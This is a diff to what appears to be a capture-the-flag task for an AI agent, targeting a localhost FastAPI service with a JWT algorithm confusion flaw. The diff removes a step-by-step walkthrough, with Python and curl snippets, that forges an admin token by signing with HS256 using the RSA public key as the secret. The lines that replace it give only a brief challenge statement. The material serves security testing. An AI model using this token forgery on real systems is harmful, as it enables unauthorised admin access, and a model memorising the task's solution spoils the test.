@@ -10,124 +10,29 @@ instruction: |-
   
   A FastAPI web service uses JWT authentication with RSA (RS256) signing. However, the implementation has a critical vulnerability: it doesn't validate that the JWT algorithm in the token header matches the expected algorithm, allowing an attacker to perform an algorithm confusion attack.
   
-  ## Vulnerability Overview
+  ## Your Task
   
-  The vulnerability chain:
-  1. The API signs tokens with RS256 (RSA private key)
-  2. Tokens are verified with the corresponding RSA public key
-  3. The public key is accessible via /auth/public-key endpoint
-  4. The verification logic accepts ANY algorithm specified in the JWT header
-  5. An attacker can switch the algorithm to HS256 (HMAC)
-  6. The attacker can use the RSA public key as the HMAC secret to forge valid tokens
+  The FastAPI web service running at http://localhost:8000 has a JWT authentication vulnerability. Your goal is to exploit this vulnerability to access the admin endpoint and retrieve the flag.
   
-  ## Implementation Steps
+  ## What You Need to Do
   
-  ### Step 1: Start the Server
-  1. Install dependencies: `pip install fastapi==0.115.5 uvicorn==0.32.1 pyjwt==2.9.0 cryptography==44.0.0 requests==2.32.3`
-  2. Start the vulnerable application:
-     ```bash
-     python /app/app.py
-     ```
-  3. Wait 2-3 seconds for the server to initialize
-  4. Verify server is running: `curl -s http://localhost:8000/health` should return `{"status": "ok"}`
+  1. Start the vulnerable application at `/app/app.py`
+  2. Investigate the available endpoints to understand the authentication mechanism
+  3. Identify and exploit the JWT vulnerability
+  4. Access the admin endpoint to retrieve the flag
+  5. Save the flag to `/app/flag.txt`
   
-  ### Step 2: Retrieve the Public Key
-  1. Make a GET request to `http://localhost:8000/auth/public-key`
-  2. The response is JSON with these fields:
-     - `key`: RSA public key in PEM format (string)
-     - `key_der_b64`: Base64-encoded DER format of the public key (string)
-     - `algorithm`: "RS256" (string)
-  3. You need the `key_der_b64` field - decode it from base64 to get raw bytes
+  ## Available Endpoints
   
-  ### Step 3: Create the Forged JWT Token
-  1. Import PyJWT library: `import jwt` and `import base64`
-  2. Decode the base64 DER key: `key_der = base64.b64decode(key_der_b64)`
-  3. Create the JWT payload:
-     ```python
-     from datetime import datetime, timedelta
-     payload = {
-         "user_id": "admin",
-         "exp": datetime.utcnow() + timedelta(hours=1),
-         "iat": datetime.utcnow(),
-     }
-     ```
-  4. **CRITICAL: Algorithm Confusion Attack**
-     - Encode the token using HS256 algorithm with the DER bytes as the secret:
-     ```python
-     forged_token = jwt.encode(payload, key_der, algorithm="HS256")
-     ```
-     - This works because the server's verify_token() function:
-       * Reads the algorithm from the JWT header (which you control)
-       * When algorithm is "HS256", it uses PUBLIC_KEY_DER as the HMAC secret
-       * This allows you to forge a valid token
-  5. The forged_token will be a string starting with eyJ (base64 encoded)
+  - `/health` - Health check endpoint
+  - `/auth/public-key` - Returns authentication-related information
+  - `/admin/flag` - Protected admin endpoint that returns the flag (requires valid JWT authentication)
   
-  ### Step 4: Access the Admin Flag Endpoint
-  1. Make a GET request to `http://localhost:8000/admin/flag`
-  2. Include the Authorization header: `Authorization: Bearer <forged_token>`
-  3. The response will be JSON with format: `{"flag": "FLAG{...}", "message": "..."}`
-  4. Extract the "flag" field value
+  ## Success Criteria
   
-  ### Step 5: Save the Flag
-  1. Read the flag value from the JSON response (the "flag" field)
-  2. Write ONLY the flag value to `/app/flag.txt`
-  3. Do NOT include any JSON formatting, just the raw flag string
-  4. Expected flag format: `FLAG{string}`
-  
-  ## HTTP Request Examples
-  
-  ### Using curl:
-  ```bash
-  # Get public key
-  curl -s http://localhost:8000/auth/public-key | python3 -c "import sys, json; print(json.load(sys.stdin)['key_der_b64'])"
-  
-  # Access flag with Bearer token
-  curl -s -H "Authorization: Bearer YOUR_FORGED_TOKEN" http://localhost:8000/admin/flag
-  ```
-  
-  ### Using Python requests:
-  ```python
-  import requests
-  
-  # Get public key
-  response = requests.get('http://localhost:8000/auth/public-key')
-  key_der_b64 = response.json()['key_der_b64']
-  
-  # Access flag with Bearer token
-  headers = {"Authorization": f"Bearer {forged_token}"}
-  response = requests.get('http://localhost:8000/admin/flag', headers=headers)
-  flag = response.json()['flag']
-  ```
-  
-  ## Common Issues & Troubleshooting
-  
-  ### Server won't start
-  - Check if port 8000 is in use: `lsof -i :8000`
-  - Ensure all dependencies are installed
-  - Check server logs for import errors
-  
-  ### Invalid token error (401)
-  - Verify you're using the DER-encoded bytes (not PEM or base64 string) as the HMAC secret
-  - Ensure algorithm in jwt.encode() is exactly "HS256"
-  - Confirm the Bearer token is properly formatted in the Authorization header
-  
-  ### Access denied error (403)
-  - Verify the payload contains `"user_id": "admin"` (case-sensitive)
-  - Check that the payload expiration (exp) is in the future
-  
-  ### Flag file not created
-  - Ensure you extract the "flag" field from the JSON response
-  - Write to the exact path: `/app/flag.txt`
-  - Include only the flag value, no extra text
-  
-  ## Expected Success Indicators
-  
-  - ✅ Health check returns `{"status": "ok"}`
-  - ✅ Public key endpoint returns JSON with `key_der_b64` field
-  - ✅ Forged token is a string (jwt.encode returns string in PyJWT 2.x)
-  - ✅ Flag endpoint returns 200 status code with JSON containing "flag" field
-  - ✅ Flag file exists at `/app/flag.txt`
-  - ✅ Flag file contains the exact flag value returned from the endpoint (should start with `FLAG{` and end with `}`)
+  - The flag must be saved to `/app/flag.txt`
+  - The file should contain only the flag value (format: `FLAG{...}`)
+  - No additional text or JSON formatting should be included
   
   The application listens on http://localhost:8000
 
